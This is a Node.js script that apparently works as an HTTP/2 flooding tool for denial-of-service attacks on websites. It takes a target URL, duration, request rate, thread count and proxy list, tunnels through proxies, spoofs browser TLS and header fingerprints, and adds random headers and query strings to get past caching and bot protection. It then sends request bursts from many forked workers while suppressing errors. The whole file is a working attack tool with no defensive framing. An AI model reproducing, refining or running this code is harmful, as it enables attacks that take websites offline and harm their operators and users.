const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = ['google.com', 'youtube.com', 'facebook.com', 'baidu.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com'];
let clength = urihost[Math.floor(Math.random() * urihost.length)];

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomIntn(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomElement(elements) { return elements[randomIntn(0, elements.length)]; }

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

const cplist = ["TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false; });
process.on('unhandledRejection', (e) => { if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false; });
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_TLSv1_3 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) { console.log(`Usage: host time req thread proxy.txt `); process.exit(); }

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
};

var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
const secureContext = tls.createSecureContext({ ciphers, sigalgs: SignalsList, honorCipherOrder: true, secureOptions, secureProtocol: "TLS_method" });

class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const connection = net.connect({ host: options.host, port: options.port });
        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);
        connection.on("connect", () => { connection.write(payload); });
        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) return callback(connection, undefined);
            connection.destroy();
            return callback(undefined, "error");
        });
        connection.on("timeout", () => { connection.destroy(); });
        connection.on("error", () => { connection.destroy(); });
    }
}

const Socker = new NetSocket();
let isp = "Unknown";

async function getIPAndISP(targetHost) {
    try {
        dns.lookup(targetHost, async (err, address) => {
            if (address) {
                const response = await fetch(`http://ip-api.com/json/${address}`);
                const data = await response.json();
                isp = data.isp || "Unknown";
            }
        });
    } catch (e) {}
}
getIPAndISP(parsedTarget.host);

if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.blue + args.target.white);
    console.log(`Time: `.blue + args.time.toString().white);
    console.log(`Rate: `.blue + args.Rate.toString().white);
    console.log(`Thread: `.blue + args.threads.toString().white);
    console.log(`--------------------------------------------`.gray);

    for (let i = 0; i < args.threads; i++) {
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${Math.floor(Math.random() * 4000) + 1000}` });
    }
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    setInterval(runFlooder, 1);
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr) return;
    const parsedProxy = proxyAddr.split(":");

    // Helper functions for randomness
    const taoDoiTuongNgauNhien = () => {
        const obj = {};
        const count = getRandomInt(2, 3);
        for (let i = 0; i < count; i++) {
            obj['cf-sec-' + generateRandomString(1, 9)] = generateRandomString(1, 10) + '-' + generateRandomString(1, 12);
        }
        return obj;
    };

    const shuffleObject = (obj) => {
        const keys = Object.keys(obj);
        for (let i = keys.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [keys[i], keys[j]] = [keys[j], keys[i]];
        }
        const shuffled = {};
        keys.forEach(k => shuffled[k] = obj[k]);
        return shuffled;
    };

    const browserType = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"][Math.floor(Math.random() * 8)];
    
    // --- Header Generation Logic ---
    let baseHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + randstr(5) + "=" + randstr(10), // Unique Query String
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    };

    // User-Agent variations based on browserType (simplified for brevity but effective)
    baseHeaders["user-agent"] = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(110, 125)}.0.0.0 Safari/537.36`;

    const proxyOptions = { host: parsedProxy[0], port: ~~parsedProxy[1], address: parsedTarget.host, timeout: 10 };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: cipper,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsSocket.on('secureConnect', () => {
            const client = http2.connect(args.target, { createConnection: () => tlsSocket });

            const sendRequests = () => {
                if (client.destroyed) return;

                for (let i = 0; i < args.Rate; i++) {
                    const dynamicHeaders = shuffleObject({
                        ...baseHeaders,
                        ...taoDoiTuongNgauNhien(),
                        "referer": "https://" + parsedTarget.host + "/" + randstr(5),
                        "x-request-id": crypto.randomUUID(),
                    });

                    const req = client.request(dynamicHeaders, {
                        weight: getRandomInt(200, 255),
                        exclusive: true
                    });
                    
                    req.on('response', () => {
                        req.close();
                        req.destroy();
                    });
                    req.end();
                }
                
                // --- Jitter Implementation ---
                // Berhenti menggunakan setInterval statis, gunakan timeout dinamis
                const jitter = getRandomInt(100, 1000);
                setTimeout(sendRequests, jitter);
            };

            sendRequests();
        });

        tlsSocket.on('error', () => { tlsSocket.destroy(); connection.destroy(); });
    });
}
